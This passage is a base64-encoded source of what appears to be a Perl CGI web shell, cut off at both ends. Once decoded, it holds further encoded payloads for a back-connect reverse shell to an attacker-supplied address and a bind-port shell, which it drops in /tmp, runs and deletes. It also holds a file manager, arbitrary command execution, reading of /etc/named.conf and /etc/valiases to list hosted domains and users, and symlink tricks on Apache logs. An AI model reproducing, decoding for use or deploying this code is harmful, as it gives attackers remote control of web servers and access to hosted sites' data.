Tb2NrZXQ7CQ0KCSRiYWNrcGVybD0iSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1NVODZPbE52WTJ0bGREc05DaVJUYUdWc2JBazlJQ0l2WW1sdUwySmhjMmdpT3cwS0pFRlNSME05UUVGU1IxWTdEUXAxYzJVZ1UyOWphMlYwT3cwS2RYTmxJRVpwYkdWSVlXNWtiR1U3RFFwemIyTnJaWFFvVTA5RFMwVlVMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLU0J2Y2lCa2FXVWdjSEpwYm5RZ0lsc3RYU0JWYm1GaWJHVWdkRzhnVW1WemIyeDJaU0JJYjNOMFhHNGlPdzBLWTI5dWJtVmpkQ2hUVDBOTFJWUXNJSE52WTJ0aFpHUnlYMmx1S0NSQlVrZFdXekZkTENCcGJtVjBYMkYwYjI0b0pFRlNSMVpiTUYwcEtTa2diM0lnWkdsbElIQnlhVzUwSUNKYkxWMGdWVzVoWW14bElIUnZJRU52Ym01bFkzUWdTRzl6ZEZ4dUlqc05DbkJ5YVc1MElDSkRiMjV1WldOMFpXUWhJanNOQ2xOUFEwdEZWQzArWVhWMGIyWnNkWE5vS0NrN0RRcHZjR1Z1S0ZOVVJFbE9MQ0FpUGlaVFQwTkxSVlFpS1RzTkNtOXdaVzRvVTFSRVQxVlVMQ0krSmxOUFEwdEZWQ0lwT3cwS2IzQmxiaWhUVkVSRlVsSXNJajRtVTA5RFMwVlVJaWs3RFFwd2NtbHVkQ0FpTFMwOVBTQkRiMjV1WldOMFpXUWdRbUZqYTJSdmIzSWdQVDB0TFNBZ1hHNWNiaUk3RFFwemVYTjBaVzBvSW5WdWMyVjBJRWhKVTFSR1NVeEZPeUIxYm5ObGRDQlRRVlpGU0VsVFZDQTdaV05vYnlBbld5dGRJRk41YzNSbGJXbHVabTg2SUNjN0lIVnVZVzFsSUMxaE8yVmphRzg3WldOb2J5QW5XeXRkSUZWelpYSnBibVp2T2lBbk95QnBaRHRsWTJodk8yVmphRzhnSjFzclhTQkVhWEpsWTNSdmNuazZJQ2M3SUhCM1pEdGxZMmh2T3lCbFkyaHZJQ2RiSzEwZ1UyaGxiR3c2SUNjN0pGTm9aV3hzSWlrN0RRcGpiRzl6WlNCVFQwTkxSVlE3IjsNCgkkYmluZHBlcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKRUZTUjBNOVFFRlNSMVk3RFFva2NHOXlkQWs5SUNSQlVrZFdXekJkT3cwS0pIQnliM1J2Q1QwZ1oyVjBjSEp2ZEc5aWVXNWhiV1VvSjNSamNDY3BPdzBLSkZOb1pXeHNDVDBnSWk5aWFXNHZZbUZ6YUNJN0RRcHpiMk5yWlhRb1UwVlNWa1ZTTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktXOXlJR1JwWlNBaWMyOWphMlYwT2lRaElqc05Dbk5sZEhOdlkydHZjSFFvVTBWU1ZrVlNMQ0JUVDB4ZlUwOURTMFZVTENCVFQxOVNSVlZUUlVGRVJGSXNJSEJoWTJzb0ltd2lMQ0F4S1NsdmNpQmthV1VnSW5ObGRITnZZMnR2Y0hRNklDUWhJanNOQ21KcGJtUW9VMFZTVmtWU0xDQnpiMk5yWVdSa2NsOXBiaWdrY0c5eWRDd2dTVTVCUkVSU1gwRk9XU2twYjNJZ1pHbGxJQ0ppYVc1a09pQWtJU0k3RFFwc2FYTjBaVzRvVTBWU1ZrVlNMQ0JUVDAxQldFTlBUazRwQ1FsdmNpQmthV1VnSW14cGMzUmxiam9nSkNFaU93MEtabTl5S0RzZ0pIQmhaR1J5SUQwZ1lXTmpaWEIwS0VOTVNVVk9WQ3dnVTBWU1ZrVlNLVHNnWTJ4dmMyVWdRMHhKUlU1VUtRMEtldzBLQ1c5d1pXNG9VMVJFU1U0c0lDSStKa05NU1VWT1ZDSXBPdzBLQ1c5d1pXNG9VMVJFVDFWVUxDQWlQaVpEVEVsRlRsUWlLVHNOQ2dsdmNHVnVLRk5VUkVWU1Vpd2dJajRtUTB4SlJVNVVJaWs3RFFvSmMzbHpkR1Z0S0NKMWJuTmxkQ0JJU1ZOVVJrbE1SVHNnZFc1elpYUWdVMEZXUlVoSlUxUWdPMlZqYUc4Z0oxc3JYU0JUZVhOMFpXMXBibVp2T2lBbk95QjFibUZ0WlNBdFlUdGxZMmh2TzJWamFHOGdKMXNyWFNCVmMyVnlhVzVtYnpvZ0p6c2dhV1E3WldOb2J6dGxZMmh2SUNkYksxMGdSR2x5WldOMGIzSjVPaUFuT3lCd2QyUTdaV05vYnpzZ1pXTm9ieUFuV3l0ZElGTm9aV3hzT2lBbk95UlRhR1ZzYkNJcE93MEtDV05zYjNObEtGTlVSRWxPS1RzTkNnbGpiRzl6WlNoVFZFUlBWVlFwT3cwS0NXTnNiM05sS0ZOVVJFVlNVaWs3RFFwOURRbz0iOw0KDQoJJENsaWVudEFkZHIgPSAkaW57J2NsaWVudGFkZHInfTsNCgkkQ2xpZW50UG9ydCA9IGludCgkaW57J2NsaWVudHBvcnQnfSk7DQoJaWYoJENsaWVudFBvcnQgZXEgMCkNCgl7DQoJCXJldHVybiAmQmFja0JpbmRGb3JtOw0KCX1lbHNpZighJENsaWVudEFkZHIgZXEgIiIpDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiYWNrcGVybCk7DQoJCWlmKC13ICIvdG1wLyIpDQoJCXsNCgkJCSRGaWxlPSIvdG1wL2JhY2tjb25uZWN0LnBsIjsJDQoJCX1lbHNlDQoJCXsNCgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiYWNrY29ubmVjdC5wbCI7DQoJCX0NCgkJb3BlbihGSUxFLCAiPiRGaWxlIik7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXN5c3RlbSgicGVybCBiYWNrY29ubmVjdC5wbCAkQ2xpZW50QWRkciAkQ2xpZW50UG9ydCIpOw0KCQl1bmxpbmsoJEZpbGUpOw0KCQlleGl0IDA7DQoJfWVsc2UNCgl7DQoJCSREYXRhPWRlY29kZV9iYXNlNjQoJGJpbmRwZXJsKTsNCgkJaWYoLXcgIi90bXAiKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iaW5kcG9ydC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmluZHBvcnQucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgYmluZHBvcnQucGwgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgIEFycmF5IExpc3QgRGlyZWN0b3J5DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUm1EaXIoJCkgDQp7DQoJbXkgJGRpciA9IHNoaWZ0Ow0KICAgIGlmKG9wZW5kaXIoRElSLCRkaXIpKQ0KCXsNCgkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpDQoJCXsNCgkJCWlmKCgkZmlsZSBuZSAiLiIpICYmICgkZmlsZSBuZSAiLi4iKSkNCgkJCXsNCgkJCQkkZmlsZT0gJGRpci4kUGF0aFNlcC4kZmlsZTsNCgkJCQlpZigtZCAkZmlsZSkNCgkJCQl7DQoJCQkJCSZSbURpcigkZmlsZSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCXVubGluaygkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCWNsb3NlZGlyKERJUik7DQoJfQ0KCWlmKCFybWRpcigkZGlyKSkNCgl7DQoJCQ0KCX0NCn0NCnN1YiBGaWxlT3duZXIoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCR1aWQsJGdpZCkgPSAoc3RhdCgkZmlsZSkpWzQsNV07DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJcmV0dXJuICI/Pz8iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJG5hbWU9Z2V0cHd1aWQoJHVpZCk7DQoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7DQoJCQlyZXR1cm4gJG5hbWUuIi8iLiRncm91cDsNCgkJfQ0KCX0NCglyZXR1cm4gIj8/PyI7DQp9DQpzdWIgUGFyZW50Rm9sZGVyKCQpDQp7DQoJbXkgJHBhdGggPSBzaGlmdDsNCglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7DQoJY2hvcCgkcGF0aCA9IGAkQ29tbWApOw0KCXJldHVybiAkcGF0aDsNCn0NCnN1YiBGaWxlUGVybXMoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCW15ICR1ciA9ICItIjsNCglteSAkdXcgPSAiLSI7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWlmKC1yICRmaWxlKXsgJHVyID0gInIiOyB9DQoJCQlpZigtdyAkZmlsZSl7ICR1dyA9ICJ3IjsgfQ0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3Ow0KCQl9ZWxzZQ0KCQl7DQoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOw0KCQkJJHJlc3VsdCA9IHNwcmludGYoIiUwNG8iLCAkbW9kZSAmIDA3Nzc3KTsNCgkJCXJldHVybiAkcmVzdWx0Ow0KCQl9DQoJfQ0KCXJldHVybiAiMDAwMCI7DQp9DQpzdWIgRmlsZUxhc3RNb2RpZmllZCgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07DQoJCSgkZCwkbSwkeSwkaCwkaSkgPSAobG9jYWx0aW1lKCRsYSkpWzMsNCw1LDIsMV07DQoJCSR5ID0gJHkgKyAxOTAwOw0KCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87DQoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkLCRtb250aFskbV0sJHksJGgsJGkpOw0KCQlyZXR1cm4gJGxtdGltZTsNCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIEZpbGVTaXplKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZiAkZmlsZSkNCgl7DQoJCXJldHVybiAtcyAkZmlsZTsNCgl9DQoJcmV0dXJuICIwIjsNCg0KfQ0Kc3ViIFBhcnNlRmlsZVNpemUoJCkNCnsNCglteSAkc2l6ZSA9IHNoaWZ0Ow0KCWlmKCRzaXplIDw9IDEwMjQpDQoJew0KCQlyZXR1cm4gJHNpemUuICIgQiI7DQoJfQ0KCWVsc2UNCgl7DQoJCWlmKCRzaXplIDw9IDEwMjQqMTAyNCkgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBLQiI7DQoJCX0NCgkJZWxzZSANCgkJew0KCQkJJHNpemUgPSBzcHJpbnRmKCIlLjJmIiwkc2l6ZSAvIDEwMjQgLyAxMDI0KTsNCgkJCXJldHVybiAkc2l6ZS4iIE1CIjsNCgkJfQ0KCX0NCn0NCnN1YiB0cmltKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmcgPX4gcy9eXHMrLy87DQoJJHN0cmluZyA9fiBzL1xzKyQvLzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBBZGRTbGFzaGVzKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmc9fiBzL1xcL1xcXFwvZzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBMaXN0RGlyDQp7DQoJbXkgJHBhdGggPSAkQ3VycmVudERpci4kUGF0aFNlcDsNCgkkcGF0aD1+IHMvXFxcXC9cXC9nOw0KCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOw0KCWlmKC1kICRwYXRoKQ0KCXsNCgkJbXkgQGZuYW1lID0gKCk7DQoJCW15IEBkbmFtZSA9ICgpOw0KCQlpZihvcGVuZGlyKERJUiwkcGF0aCkpDQoJCXsNCgkJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQkJew0KCQkJCSRmPSRwYXRoLiRmaWxlOw0KCQkJCWlmKC1kICRmKQ0KCQkJCXsNCgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQlwdXNoKEBmbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQkJY2xvc2VkaXIoRElSKTsNCgkJfQ0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7DQoJCUBkbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBkbmFtZTsNCgkJJHJlc3VsdCAuPSAiPGRpdj48dGFibGUgd2lkdGg9JzkwJScgY2xhc3M9J2xpc3RkaXInPg0KDQoJCTx0ciBzdHlsZT0nYmFja2dyb3VuZC1jb2xvcjogIzNlM2UzZSc+PHRoPkZpbGUgTmFtZTwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5GaWxlIFNpemU8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+UGVybWlzc2lvbjwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTUwcHg7Jz5MYXN0IE1vZGlmaWVkPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOw0KCQlteSAkc3R5bGU9ImxpbmUiOw0KCQlteSAkaT0wOw0KCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZCA9ICZ0cmltKCRkKTsNCgkJCSRkaXJuYW1lPSRkOw0KCQkJaWYoJGQgZXEgIi4uIikgDQoJCQl7DQoJCQkJJGQgPSAmUGFyZW50Rm9sZGVyKCRwYXRoKTsNCgkJCX0NCgkJCWVsc2lmKCRkIGVxICIuIikgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aDsNCgkJCX0NCgkJCWVsc2UgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aC4kZDsNCgkJCX0NCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz4NCg0KCQkJPHRkIGlkPSdGaWxlXyRpJyBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPjxhICBocmVmPSc/YT1ndWkmZD0iLiRkLiInPlsgIi4kZGlybmFtZS4iIF08L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPkRJUjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOycgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZCkuIicsJyIuJGRpcm5hbWUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCIuJGkuIiwnIi4kZGlybmFtZS4iJylcIiA+Ii4mRmlsZVBlcm1zKCRkKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJylcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQlmb3JlYWNoIG15ICRmIChAZm5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZT0kZjsNCgkJCSRmID0gJHBhdGguJGY7DQoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+PHRkIGlkPSdGaWxlXyRpJyBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyc+PGEgaHJlZj0nP2E9Y29tbWFuZCZkPSIuJHBhdGguIiZjPWVkaXQlMjAiLiRmaWxlLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mUGFyc2VGaWxlU2l6ZSgmRmlsZVNpemUoJGYpKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRmKS4iJywnIi4kZmlsZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oJGksJyRmaWxlJylcIiA+Ii4mRmlsZVBlcm1zKCRmKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRmKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz5FZGl0PC9hPiB8IDxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZmlsZScsJ2YnKVwiPlJlbmFtZTwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5Eb3dubG9hZDwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBmaWxlOiAkZmlsZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8L3RyPiI7DQoJCQkkaSsrOw0KCQl9DQoJCSRyZXN1bHQgLj0gIjwvdGFibGU+PC9kaXY+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRyeSB0byBWaWV3IExpc3QgVXNlcg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdEb21haW5Vc2VyDQp7DQoJb3BlbiAoZG9tYWlucywgJy9ldGMvbmFtZWQuY29uZicpIG9yICRlcnI9MTsNCglteSBAY256cyA9IDxkb21haW5zPjsNCgljbG9zZSBkMG1haW5zOw0KCW15ICRzdHlsZT0ibGluZSI7DQoJbXkgJHJlc3VsdD0iPGg1Pjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Ib2FuZyBTYSAtIFRydW9uZyBTYTwvZm9udD48L2g1PiI7DQoJaWYgKCRlcnIpDQoJew0KCQkkcmVzdWx0IC49ICAoJzxwPkMwdWxkblwndCBCeXBhc3MgaXQgLCBTb3JyeTwvcD4nKTsNCgkJcmV0dXJuICRyZXN1bHQ7DQoJfWVsc2UNCgl7DQoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOw0KCX0NCglmb3JlYWNoIG15ICRvbmUgKEBjbnpzKQ0KCXsNCgkJaWYoJG9uZSA9fiBtLy4qP3pvbmUgIiguKj8pIiB7LykNCgkJewkNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZW5hbWU9ICIvZXRjL3ZhbGlhc2VzLyIuJG9uZTsNCgkJCSRvd25lciA9IGdldHB3dWlkKChzdGF0KCRmaWxlbmFtZSkpWzRdKTsNCgkJCSRyZXN1bHQgLj0gJzx0ciBjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7DQoJCX0NCgl9DQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBWaWV3IExvZw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdMb2cNCnsNCglpZigkV2luTlQpDQoJew0KCQlyZXR1cm4gIjxoMj48Zm9udCBzdHlsZT0nZm9udDogMjBwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+RG9uJ3QgcnVuIG9uIFdpbmRvd3M8L2ZvbnQ+PC9oMj4iOw0KCX0NCglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOw0KCW15IEBwYXRobG9nPSgNCgkJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLA0KCQkJCScvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLA0KCQkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2FjY2Vzc19sb2cnDQoJCQkJKTsNCglteSAkaT0wOw0KCW15ICRwZXJtczsNCglteSAkc2w7DQoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykNCgl7DQoJCWlmKC13ICRsb2cpDQoJCXsNCgkJCSRwZXJtcz0iT0siOw0KCQl9ZWxzZQ0KCQl7DQoJCQljaG9wKCRzbCA9IGBsbiAtcyAkbG9nIGVycm9yX2xvZ18kaWApOw0KCQkJaWYoJnRyaW0oJGxzKSBlcSAiIikNCgkJCXsNCgkJCQlpZigtciAkbHMpDQoJCQkJew0KCQkJCQkkcGVybXM9Ik9LIjsNCgkJCQkJJGxvZz0iZXJyb3JfbG9nXyIuJGk7DQoJCQkJfQ0KCQkJfWVsc2UNCgkJCXsNCgkJCQkkcGVybXM9Ijxmb250IHN0eWxlPSdjb2xvcjogcmVkOyc+Q2FuY2VsPGZvbnQ+IjsNCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49PDxFTkQ7DQoJCTx0cj4NCg0KCQkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dfJGknKS52YWx1ZT0nbGVzcyAnICsgdGhpcy52YWx1ZTsiIHZhbHVlPSIkbG9nIiBzaXplPSc1MCcvPjwvdGQ+DQoJCQk8dGQ+PGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlRyeSIgLz48L3RkPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgaWQ9ImxvZ18kaSIgbmFtZT0iYyIgdmFsdWU9Imxlc3MgJGxvZyIvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiIC8+DQoJCQk8L2Zvcm0+DQoJCQk8dGQ+JHBlcm1zPC90ZD4NCg0KCQk8L3RyPg0KRU5EDQoJCSRpKys7DQoJfQ0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWluIFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCiRBY3Rpb24gPSAkaW57J2EnfTsNCg0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsgIyBubyBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdA0KDQojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkDQokQ3VycmVudERpciA9ICZ0cmltKCRpbnsnZCd9KTsNCiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQ0KJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiIGlmKCRSdW5Db21tYW5kIGVxICIiKTsNCmNob3AoJEN1cnJlbnR